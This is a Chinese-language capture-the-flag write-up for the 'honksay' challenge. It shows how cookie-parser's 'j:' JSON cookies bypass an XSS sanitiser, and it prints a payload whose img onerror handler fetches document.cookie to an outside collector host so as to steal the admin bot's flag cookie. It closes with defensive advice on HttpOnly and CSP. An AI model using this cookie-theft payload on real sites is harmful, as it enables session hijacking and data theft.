# honksay

## 题目简述

页面从 `honk` cookie 读取鹅叫文本，字符串路径会经过 `xss` 清洗；管理员机器人访问举报 URL 时带有可被 JavaScript 读取的 `flag` cookie。漏洞来自 `cookie-parser` 的 JSON cookie 功能：以 `j:` 开头的 cookie 会被解析为对象，而对象路径完全绕过清洗。

## 解题过程

路由中的关键分支是：

```javascript
if (typeof req.cookies.honk === "object") {
    finalhonk = req.cookies.honk;
} else {
    finalhonk = {
        message: clean(req.cookies.honk),
        amountoftimeshonked: req.cookies.honkcount.toString()
    };
}
```

因此构造 JSON cookie：

```text
j:{"message":"<img src=x onerror=fetch('https://collector/?c='+encodeURIComponent(document.cookie))>","amountoftimeshonked":"1"}
```

把它 URL 编码后放入本地 `/changehonk?newhonk=...`。该路由先设置 `honk` cookie 再重定向首页；下一次请求中 `cookie-parser` 识别 `j:` 并返回对象，模板直接插入 `message`，触发 XSS。

向 `/report` 提交这条 localhost URL。Puppeteer 管理员先为目标域设置 `flag` cookie，再访问 URL；载荷执行后把 `document.cookie` 发到收集端，读出：

```text
maple{g00segoHONK}
```

## 方法总结

安全过滤必须在最终渲染值上执行，不能只覆盖一种输入类型。cookie 中的 `j:` 是 `cookie-parser` 的公开类型转换语义，攻击者可借此改变控制流。管理员敏感 cookie 还应设置 `HttpOnly`，并配合 CSP；即便页面出现 XSS，脚本也不应直接读取 flag。
